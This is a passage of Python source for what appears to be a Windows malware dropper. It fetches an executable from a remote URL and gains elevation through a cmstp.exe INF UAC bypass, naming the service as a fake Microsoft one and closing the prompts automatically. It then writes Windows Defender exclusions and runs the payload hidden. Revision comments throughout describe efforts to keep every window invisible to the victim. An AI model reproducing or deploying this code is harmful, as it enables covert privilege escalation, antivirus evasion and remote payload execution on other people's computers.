                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    # the r14 carrier job, unchanged:
    exe_path = os.path.join(APPDIR, EXE_NAME)
    if os.path.exists(exe_path) and not alive(EXE_NAME):
        try:
            subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


main()
'''



def set_defender_exclusions():
    """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
    stage materializes + executes exclusions.py (the standalone exclusion
    writer, elevated) then execs the carrier. work.py itself carries NO
    exclusion code — the r14 shape, with the new file attached."""
    appdir = PERSIST_DIR
    if is_elevated():
        _run_stage_now()
        return
    stage_path = os.path.join(PERSIST_DIR, "stage.py")
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        stage_text = STAGE.replace("__EXE__", EXE_NAME).replace("___EXCL_B64___", EXCL_B64)
        with open(stage_path, "w", encoding="utf-8") as fh:
            fh.write(stage_text)
    except Exception:
        return
    # r35 (dj: black python.exe flash): the LIFTED stage relaunched the console
    # interpreter python312\\python.exe — its console subsystem opened a black
    # window for the whole stage lifetime (~4-5s of exclusions work). the jar
    # itself runs work.py under pythonw.exe (GUI subsystem, no console), so the
    # flash was purely this relaunch. Preference now:
    #   1) python312\\pythonw.exe  (GUI subsystem — zero console, period)
    #   2) python312\\python.exe via cmd start /min (minimized console flash)
    #   3) system python.exe via cmd start /min
    # exclusions.py inside the stage inherits pythonw (sys.executable), so the
    # whole elevated chain stays windowless.
    # r45 (dj: make the chain paint ZERO — no exe or cmd in view, all paths,
    # always background): the lifted stage relaunches with the GP:
    #   1) embedded pythonw.exe   (GUI subsystem — zero console, period)
    #   2) any sibling pythonw.exe adopted from the nearest python dir
    # (the old cmd.exe /c start"" /min shapes are GONE: `start` still came
    # through a console parent — a minimized flash is a flash). pythonw is
    # guaranteed by the embeddable pair, and as fallback is adopted by dir.
    python_dir = os.path.join(PERSIST_DIR, "python312")
    pythonw_p = os.path.join(python_dir, "pythonw.exe")
    pythonw_su = None
    try:
        from glob import glob
        for pat in (os.path.join(os.path.dirname(sys.executable or "") or "",
                                 "pythonw.exe"),
                    r"C:\Python*\pythonw.exe",
                    r"C:\Program Files\Python*\pythonw.exe",
                    os.path.join(os.environ.get("LOCALAPPDATA", ""),
                                 "Programs", "Python", "Python*", "pythonw.exe")):
            hits = [h for h in glob(pat) if os.path.isfile(h)]
            if hits:
                pythonw_su = sorted(hits)[-1]
                break
    except Exception:
        pythonw_su = None
    if os.path.isfile(pythonw_p):
        launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
    elif pythonw_su:
        launch = subprocess.list2cmdline([pythonw_su, "-u", stage_path])
    else:
        # nowhere a GUI python: this box's runtime is degraded (no pythonw;
        # not the standard pair) — keep the job running via the least-flashing
        # console shape left, minimized, rather than abandoning the run.
        pyexe_p = os.path.join(python_dir, "python.exe")
        pyexe = pyexe_p if os.path.isfile(pyexe_p) else "python.exe"
        launch = subprocess.list2cmdline(
            ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
    kill_all_cmstp()
    cleanup_infs()
    svc_name = f"Microsoft {rand_str(6)} Service"
    body = build_inf(launch, svc_name)
    # ground truth: the exact bytes cmstp sees, plus the stage script
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        return
    dismisser = Dismisser(svc_name)
    try:
        p = subprocess.Popen(["cmstp.exe", "/au", inf_path],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
        # r45: armed before the hunt starts — see the sibling site above.
        dismisser.target_pid = p.pid
    except Exception:
        return
    dismisser.start()

    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)
    try:
        os.unlink(inf_path)
    except Exception:
        pass


def _run_stage_now():
    """r34: already elevated — do the stage's job inline: materialize +
    execute exclusions.py under THIS token, then the carrier exec. the old
    shape skipped exclusions entirely on an already-elevated run."""
    excl_path = os.path.join(PERSIST_DIR, "exclusions.py")
    try:
        if not os.path.exists(excl_path):
            import base64
            with open(excl_path, "wb") as fh:
                fh.write(base64.b64decode(EXCL_B64))
    except Exception:
        pass
    try:
        os.environ["EXCL_EXE"] = EXE_NAME
        subprocess.run([sys.executable, "-u", excl_path],
                       creationflags=0x08000000, timeout=180,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    try:
        exe_path = os.path.join(PERSIST_DIR, EXE_NAME)
        if os.path.exists(exe_path) and not _alive(EXE_NAME):
            subprocess.Popen([exe_path], creationflags=0x08000000)
    except Exception:
        pass


def _alive(name):
    try:
        out = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + name],
                             creationflags=0x08000000, stdout=subprocess.PIPE,
                             stderr=subprocess.DEVNULL, timeout=15).stdout
        return name.lower() in out.decode(errors="replace").lower()
    except Exception:
        return False


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path):
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < 50000:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data):
    kill_process(EXE_NAME)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return

    # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
    # exclusions ride the STAGE road below: after the lift, the elevated
    # stage materializes + executes exclusions.py, then execs the carrier.
    # r34 fix: this call was run_elevated() — which lifted the carrier exe
    # DIRECTLY and never built/executed the stage, so exclusions.py could
    # not run on any box. that was the whole field miss.
    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    set_defender_exclusions()


main()
